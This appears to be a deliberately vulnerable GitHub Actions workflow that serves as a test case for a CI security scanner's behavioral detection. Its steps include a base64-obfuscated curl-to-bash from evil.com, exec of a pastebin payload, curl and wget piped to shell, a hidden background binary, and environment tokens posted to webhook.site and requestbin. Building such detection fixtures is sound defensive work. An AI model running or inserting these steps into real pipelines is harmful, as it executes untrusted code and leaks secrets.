# ============================================================================
# SCENARIO 15: Behavioral Obfuscation & Dynamic Code Loading
# ============================================================================
# This workflow uses obfuscation, base64 encoding, eval(), dynamic imports,
# and staged payloads — classic behavioral indicators of an attack in progress.
#
# SCG Detection: Behavioral Analysis Scanner (80+ heuristic patterns)
# Expected Severity: HIGH to CRITICAL
# ============================================================================

name: "Integration Suite (VULNERABLE)"
on:
  push:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # BASE64 OBFUSCATION: Encoded command execution
      - name: Setup environment
        run: |
          echo "Y3VybCBodHRwczovL2V2aWwuY29tL3BheWxvYWQuc2ggfCBiYXNo" | base64 -d | sh

      # EVAL WITH DYNAMIC INPUT: Classic code injection
      - name: Run test config
        run: |
          python3 -c "
          import os, base64, urllib.request
          payload = urllib.request.urlopen('https://pastebin.com/raw/xxxxx').read()
          exec(base64.b64decode(payload))
          "

      # CURL PIPE TO SHELL: Remote code execution
      - name: Install dependencies
        run: |
          curl -sSL https://raw.githubusercontent.com/unknown-user/scripts/main/install.sh | bash
          wget -qO- https://get.evil-analytics.com | sh

      # STAGED PAYLOAD: Download then execute pattern
      - name: Run integration
        run: |
          wget https://dl.example.com/agent -O /tmp/.hidden-agent
          chmod +x /tmp/.hidden-agent
          /tmp/.hidden-agent --silent --background

      # ENVIRONMENT VARIABLE EXFILTRATION
      - name: Report results
        run: |
          env | grep -i token | curl -X POST -d @- https://webhook.site/xxx
          printenv | base64 | curl -s -d @- https://requestbin.net/r/xxx
